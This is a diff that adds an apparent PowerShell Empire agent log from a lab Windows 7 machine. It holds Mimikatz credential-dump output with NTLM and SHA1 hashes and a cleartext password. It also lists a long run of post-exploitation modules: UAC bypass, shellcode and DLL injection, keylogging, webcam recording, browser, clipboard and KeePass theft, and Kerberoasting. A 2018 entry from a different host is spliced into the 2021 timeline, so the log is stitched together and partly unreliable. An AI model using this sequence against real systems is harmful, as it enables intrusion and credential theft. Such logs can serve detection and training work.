@@ -1,0 +1,359 @@
+
+2021-08-10 05:37:10 : 
+
+[*] Agent info:
+  ID              	3
+  session_id      	SVFCBGWK
+  listener        	main
+  name            	SVFCBGWK
+  language        	powershell
+  language_version	2
+  delay           	5
+  jitter          	0.0
+  external_ip     	192.168.83.142
+  internal_ip     	192.168.83.142
+  username        	WIN-70C2HL5GMSS\Hp
+  high_integrity  	1
+  process_name    	powershell
+  process_id      	4052
+  hostname        	WIN-70C2HL5GMSS
+  os_details      	Microsoft Windows 7 Ultimate
+  session_key     	~d<{$Mm7-LP1DGN%&it/V@f8\y=}?B>U
+  nonce           	4103576557438094
+  checkin_time    	2021-08-10 09:37:10+00:00
+  lastseen_time   	2021-08-10 09:37:10+00:00
+  parent          	None
+  children        	None
+  servers         	None
+  profile         	/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT
+                                6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+  kill_date       	
+  working_hours   	
+  lost_limit      	60
+
+[+] Agent SVFCBGWK now active:
+
+
+2021-08-10 05:37:28 : 
+tasked agent SVFCBGWK to run module Invoke-Mimikatz DumpCreds
+
+2021-08-10 05:37:58 : 
+Job started: 2XWHAN
+
+2021-08-10 05:38:25 : 
+Hostname: WIN-70C2HL5GMSS / S-1-5-21-1422189840-4090892745-2680004238
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1018177 (00000000:000f8941)
+Session           : Interactive from 1
+User Name         : Hp
+Domain            : WIN-70C2HL5GMSS
+Logon Server      : WIN-70C2HL5GMSS
+Logon Time        : 8/10/2021 2:40:52 PM
+SID               : S-1-5-21-1422189840-4090892745-2680004238-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * NTLM     : 0cb6948805f797bf2a82807973b89537
+	 * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
+	 [00010000] CredentialKeys
+	 * NTLM     : 0cb6948805f797bf2a82807973b89537
+	 * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
+	tspkg :	
+	wdigest :	
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * Password : test
+	kerberos :	
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1018148 (00000000:000f8924)
+Session           : Interactive from 1
+User Name         : Hp
+Domain            : WIN-70C2HL5GMSS
+Logon Server      : WIN-70C2HL5GMSS
+Logon Time        : 8/10/2021 2:40:52 PM
+SID               : S-1-5-21-1422189840-4090892745-2680004238-1000
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 0cb6948805f797bf2a82807973b89537
+	 * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
+	 [00000003] Primary
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * NTLM     : 0cb6948805f797bf2a82807973b89537
+	 * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
+	tspkg :	
+	wdigest :	
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * Password : test
+	kerberos :	
+	 * Username : Hp
+	 * Domain   : WIN-70C2HL5GMSS
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/10/2021 1:51:13 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN-70C2HL5GMSS$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/10/2021 1:51:12 PM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-70C2HL5GMSS$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-70c2hl5gmss$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 48392 (00000000:0000bd08)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/10/2021 1:51:11 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN-70C2HL5GMSS$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/10/2021 1:51:11 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-70C2HL5GMSS$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-70c2hl5gmss$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(powershell) # exit
+Bye!
+
+
+
+2021-08-10 05:38:46 : 
+tasked agent SVFCBGWK to run module Get Microsoft Updates
+
+2021-08-10 05:38:46 : 
+Job started: PKR8ZV
+
+2021-08-10 05:39:12 : 
+
+
+Date      : 5/13/2021 12:38:49 PM
+Operation : Installation
+Status    : Succeeded
+Title     : Update for Windows (KB958488)
+KB        : KB958488)
+PC        : WIN-70C2HL5GMSS
+
+Date      : 3/9/2021 1:14:45 PM
+Operation : Installation
+Status    : Succeeded
+Title     : Security Update for Windows (KB4474419)
+KB        : KB4474419)
+PC        : WIN-70C2HL5GMSS
+
+
+
+
+
+Get-WinUpdates completed
+
+
+2021-08-10 05:41:32 : 
+tasked agent SVFCBGWK to run module Get-Screenshot
+
+2021-08-10 05:41:36 : 
+Output saved to ./downloads/SVFCBGWK/Get-Screenshot/WIN-70C2HL5GMSS_2021-08-10_05-41-36.png
+
+2021-08-10 05:41:45 : 
+tasked agent SVFCBGWK to run module Out-Minidump
+
+2021-08-10 05:41:46 : 
+Job started: 39H7TM
+
+2021-08-10 05:42:22 : 
+tasked agent SVFCBGWK to run module Invoke-EventVwrBypass
+
+2021-08-10 05:45:15 : 
+tasked agent SVFCBGWK to run module Get-ClipboardContents
+
+2021-08-10 05:45:32 : 
+tasked agent SVFCBGWK to run module Get-BrowserData
+
+2021-08-10 05:47:25 : 
+tasked agent SVFCBGWK to run module Invoke-Registry
+
+2021-08-10 05:56:52 : 
+tasked agent SVFCBGWK to run module Invoke-PowerDump
+
+2021-08-10 05:58:45 : 
+tasked agent SVFCBGWK to run module Invoke-SessionGopher
+
+2018-01-26 02:40:03 : 
+Tasked agent to run module powershell/credentials/sessiongopher
+
+2018-01-26 02:40:10 : 
+
+          o_       
+         /  ".   SessionGopher - RDP, WinSCP, FileZilla, PuTTY, SuperPuTTY, 
+       ,"  _-"      .sdtid, .rdp, .ppk saved session & password extractor
+     ,"   m m         
+  ..+     )      Brandon Arvanaghi
+     `m..m       Twitter: @arvanaghi | arvanaghi.com
+  
+
+2018-01-26 02:44:19 : 
+Tasked agent to run shell command dir
+
+2018-01-26 02:44:25 : 
+Directory: C:\Users\IEUser
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--        11/23/2014   9:10 PM            Contacts                          
+d-r--         1/25/2018   5:59 PM            Desktop                           
+d-r--        11/23/2014   9:10 PM            Documents                         
+d-r--        11/23/2014   9:10 PM            Downloads                         
+d-r--        11/23/2014   9:10 PM            Favorites                         
+d-r--        11/23/2014   9:10 PM            Links                             
+d-r--        11/23/2014   9:10 PM            Music                             
+d-r--        11/23/2014   9:10 PM            Pictures                          
+d-r--        11/23/2014   9:10 PM            Saved Games                       
+d-r--        11/23/2014   9:10 PM            Searches                          
+d-r--        11/23/2014   9:10 PM            Videos                            
+-a---         1/25/2018   6:10 PM     151200 sdelete.exe                       
+-a---         1/25/2018   6:35 PM     199168 wce.exe                           
+
+
+..Command execution completed.
+
+2021-08-11 01:08:38 : 
+tasked agent SVFCBGWK to run module Invoke-SessionGopher
+
+2021-08-11 01:31:28 : 
+tasked agent SVFCBGWK to run module Invoke-DllInjection
+
+2021-08-11 01:32:30 : 
+tasked agent SVFCBGWK to run module Invoke-MetasploitPayload
+
+2021-08-11 01:33:43 : 
+tasked agent SVFCBGWK to run module Invoke-ReflectivePEInjection
+
+2021-08-11 01:37:12 : 
+tasked agent SVFCBGWK to run module Invoke-Shellcode
+
+2021-08-11 01:38:31 : 
+tasked agent SVFCBGWK to run module Invoke-ShellcodeMSIL
+
+2021-08-11 01:42:08 : 
+tasked agent SVFCBGWK to run module Start-WebcamRecorder
+
+2021-08-11 01:43:02 : 
+tasked agent SVFCBGWK to run module Get-ClipboardContents
+
+2021-08-11 01:43:54 : 
+tasked agent SVFCBGWK to run module Invoke-FileFinder
+
+2021-08-11 01:44:39 : 
+tasked agent SVFCBGWK to run module Find-InterestingFile
+
+2021-08-11 01:48:09 : 
+tasked agent SVFCBGWK to run module Get-KeyStrokes
+
+2021-08-11 01:48:42 : 
+tasked agent SVFCBGWK to run module Out-Minidump
+
+2021-08-11 02:00:23 : 
+tasked agent SVFCBGWK to run module Invoke-PacketCapture
+
+2021-08-11 02:12:03 : 
+tasked agent SVFCBGWK to run module Invoke-EventVwrBypass
+
+2021-08-11 03:15:10 : 
+tasked agent SVFCBGWK to run module Add-KeePassConfigTrigger
+
+2021-08-11 03:20:54 : 
+tasked agent SVFCBGWK to run module Find-KeePassconfig
+
+2021-08-11 03:21:40 : 
+tasked agent SVFCBGWK to run module Get-KeePassconfig
+
+2021-08-11 03:22:16 : 
+tasked agent SVFCBGWK to run module Invoke-KeeThief
+
+2021-08-11 03:25:26 : 
+tasked agent SVFCBGWK to run module Remove-KeePassConfigTrigger
+
+2021-08-11 04:36:30 : 
+tasked agent SVFCBGWK to run module Invoke-CredentialInjection
+
+2021-08-11 04:37:58 : 
+tasked agent SVFCBGWK to run module enum_cred_store
+
+2021-08-11 04:38:38 : 
+tasked agent SVFCBGWK to run module Invoke-Kerberoast
+
+2021-08-11 04:39:20 : 
+tasked agent SVFCBGWK to run module Invoke-Mimikatz LSA Dump
+
+2021-08-11 04:40:06 : 
+tasked agent SVFCBGWK to run module Invoke-Mimikatz DumpCerts
